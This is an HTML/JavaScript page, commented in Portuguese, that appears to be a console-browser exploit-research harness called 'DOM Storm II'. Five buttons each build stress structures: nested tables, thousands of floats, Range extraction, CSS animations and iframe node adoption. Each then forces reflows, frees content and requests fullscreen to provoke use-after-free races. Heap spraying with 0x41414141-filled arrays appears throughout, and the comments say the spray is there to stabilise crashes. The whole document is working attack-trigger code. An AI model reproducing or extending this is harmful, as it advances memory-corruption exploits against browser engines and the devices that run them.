<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v520000: DOM Storm II</title>
<style>
    body { background: #111; color: #0f0; font-family: monospace; text-align: center; padding: 10px; }
    h1 { border-bottom: 2px solid #0f0; color: #fff; }
    .status { 
        border: 2px solid #fff; padding: 15px; margin-bottom: 20px; 
        font-size: 1.2em; background: #030; color: #fff; font-weight: bold;
    }
    
    button {
        display: block; width: 100%; padding: 25px; margin: 15px 0;
        background: #040; color: #fff; border: 2px solid #0f0;
        font-size: 20px; font-weight: bold; cursor: pointer; text-transform: uppercase;
    }
    button:hover { background: #0f0; color: #000; }
    
    #stage { background: #000; height: 100px; border: 1px solid #555; margin-top: 20px; overflow: hidden; }
    
    /* Estilos para estresse de layout */
    .complex { display: flex; flex-wrap: wrap; transform: rotate(1deg); }
    .floaty { float: left; width: 1px; height: 1px; border: 1px solid red; }
    .anim { animation: spin 1s infinite; }
    @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
</style>
</head>
<body>

<h1>v520000: DOM STORM II</h1>

<div class="status" id="msg">
    ESTRATÉGIA: ESTRUTURAS COMPLEXAS -> ALERTA -> FULLSCREEN<br>
    CLIQUE -> LEIA O ALERTA -> CLIQUE OK
</div>

<button onclick="dom_storm(d01)">01. Table Layout Collapse</button>

<button onclick="dom_storm(d02)">02. Float Clear + Reflow</button>

<button onclick="dom_storm(d03)">03. Range ExtractContents Race</button>

<button onclick="dom_storm(d04)">04. Animation State Desync</button>

<button onclick="dom_storm(d05)">05. Iframe Adoption Race</button>

<div id="stage">ALVO</div>

<script>
    const Stage = document.getElementById('stage');
    
    // Spray Global para estabilizar crashes
    let memory_filler = [];
    const spray_val = new Uint32Array(1024).fill(0x41414141);

    function dom_storm(vectorFunc) {
        Stage.innerHTML = "";
        memory_filler = [];
        
        // 1. Prepara a estrutura complexa
        const root = vectorFunc(Stage);
        
        // 2. Aguarda renderização inicial
        setTimeout(() => {
            if(root._trigger) root._trigger();
        }, 200);
    }

    // =================================================================
    // 01. Table Layout Collapse
    // Tabelas têm algoritmos de layout muito pesados e cheios de bugs antigos.
    // Criamos uma tabela gigante aninhada e a destruímos no Fullscreen.
    // =================================================================
    function d01(stage) {
        const table = document.createElement('table');
        let currRow = table.insertRow();
        let currCell = currRow.insertCell();
        
        // Cria tabela aninhada 100 níveis (Matemática pesada de layout)
        for(let i=0; i<100; i++) {
            const t = document.createElement('table');
            t.style.border = "1px solid blue";
            const r = t.insertRow();
            const c = r.insertCell();
            c.innerText = "X";
            currCell.appendChild(t);
            currCell = c;
        }
        stage.appendChild(table);

        table._trigger = () => {
            window.alert("⚠️ TABLE BOMB ⚠️\nAo clicar OK: Colapso da Tabela -> Fullscreen.");
            
            // 1. Muda o estilo para forçar recálculo total
            // 'fixed' é calculado diferente de 'auto'
            table.style.tableLayout = "fixed"; 
            
            // 2. Remove metade da estrutura
            currCell.innerHTML = ""; 
            
            // 3. Fullscreen no BODY (Pai estável)
            try {
                if (document.body.webkitRequestFullscreen) document.body.webkitRequestFullscreen();
                else if (document.body.requestFullscreen) document.body.requestFullscreen();
            } catch(e){}
            
            // 4. Spray imediato
            for(let i=0; i<2000; i++) memory_filler.push(new Uint32Array(spray_val));
        };
        return table;
    }

    // =================================================================
    // 02. Float Clear + Reflow
    // Elementos flutuantes (float: left) causam problemas complexos
    // quando removidos em massa.
    // =================================================================
    function d02(stage) {
        const container = document.createElement('div');
        // Cria 5000 elementos flutuantes
        for(let i=0; i<5000; i++) {
            const d = document.createElement('div');
            d.className = 'floaty';
            container.appendChild(d);
        }
        stage.appendChild(container);

        container._trigger = () => {
            window.alert("⚠️ FLOAT HELL ⚠️\nAo clicar OK: Mudança de Layout -> Fullscreen.");
            
            // 1. Transforma tudo em 'position: absolute' (Tira do fluxo)
            // Isso força o motor a recalcular a posição de 5000 itens
            const kids = container.children;
            for(let i=0; i<kids.length; i++) {
                kids[i].style.position = "absolute";
            }
            
            // 2. Fullscreen
            try {
                if (document.body.webkitRequestFullscreen) document.body.webkitRequestFullscreen();
                else if (document.body.requestFullscreen) document.body.requestFullscreen();
            } catch(e){}
            
            // 3. Spray
            memory_filler.push(new Float64Array(10000));
        };
        return container;
    }

    // =================================================================
    // 03. Range ExtractContents Race
    // Usa a API de Range para mover pedaços do DOM na memória.
    // Isso é complexo e propenso a UAF.
    // =================================================================
    function d03(stage) {
        const container = document.createElement('div');
        container.innerHTML = "<b>BOLD</b><i>ITALIC</i><u>UNDER</u>".repeat(500);
        stage.appendChild(container);

        container._trigger = () => {
            window.alert("⚠️ RANGE EXTRACT ⚠️\nAo clicar OK: Mover Memória -> Fullscreen.");
            
            // 1. Cria um Range selecionando todo o conteúdo
            const range = document.createRange();
            range.selectNodeContents(container);
            
            // 2. Extrai o conteúdo (Remove do DOM e coloca na memória RAM)
            // O renderizador tem que lidar com o sumiço instantâneo
            const fragment = range.extractContents();
            
            // 3. Fullscreen
            try {
                if (document.body.webkitRequestFullscreen) document.body.webkitRequestFullscreen();
                else if (document.body.requestFullscreen) document.body.requestFullscreen();
            } catch(e){}
            
            // 4. Descarta o fragmento (Free)
            // Se o renderizador ainda estiver tentando desenhar o container vazio...
            fragment.textContent = "";
        };
        return container;
    }

    // =================================================================
    // 04. Animation State Desync
    // Usa animações CSS rodando na GPU.
    // Ao clicar OK, mudamos o 'display' para 'none', matando a animação.
    // =================================================================
    function d04(stage) {
        const container = document.createElement('div');
        container.className = 'complex';
        
        // Cria elementos animados
        for(let i=0; i<200; i++) {
            const d = document.createElement('div');
            d.className = 'anim';
            d.style.width = "50px"; d.style.height = "50px"; 
            d.style.background = i%2?"red":"blue";
            container.appendChild(d);
        }
        stage.appendChild(container);

        container._trigger = () => {
            window.alert("⚠️ ANIMATION KILL ⚠️\nAo clicar OK: Parar GPU -> Fullscreen.");
            
            // 1. Mata a renderização (Display None remove da Render Tree)
            container.style.display = "none";
            
            // 2. Força um acesso de layout que exige cálculo (Reflow forçado)
            // Tentando ler propriedade de elemento oculto
            const junk = container.offsetHeight; 
            
            // 3. Fullscreen
            try {
                if (document.body.webkitRequestFullscreen) document.body.webkitRequestFullscreen();
                else if (document.body.requestFullscreen) document.body.requestFullscreen();
            } catch(e){}
        };
        return container;
    }

    // =================================================================
    // 05. Iframe Adoption Race
    // Move elementos de um documento (iframe) para outro (principal).
    // `document.adoptNode` muda o dono do objeto na memória.
    // =================================================================
    function d05(stage) {
        const ifr = document.createElement('iframe');
        stage.appendChild(ifr);
        
        ifr.onload = () => {
            // Cria elementos dentro do iframe
            const doc = ifr.contentDocument;
            const div = doc.createElement('div');
            div.innerHTML = "<h1>MOVE ME</h1>".repeat(100);
            doc.body.appendChild(div);

            ifr._trigger = () => {
                window.alert("⚠️ NODE ADOPTION ⚠️\nAo clicar OK: Trocar Dono -> Fullscreen.");
                
                // 1. Adota o nó (Muda o Owner Document na memória C++)
                const adopted = document.adoptNode(div);
                
                // 2. Remove o iframe original (Destrói o documento antigo)
                ifr.remove();
                
                // 3. Adiciona o nó adotado ao palco
                stage.appendChild(adopted);
                
                // 4. Fullscreen
                try {
                    if (document.body.webkitRequestFullscreen) document.body.webkitRequestFullscreen();
                    else if (document.body.requestFullscreen) document.body.requestFullscreen();
                } catch(e){}
            };
        };
        // Pequeno hack para expor o trigger
        return { _trigger: () => { if(ifr._trigger) ifr._trigger(); } };
    }

</script>
</body>
</html>
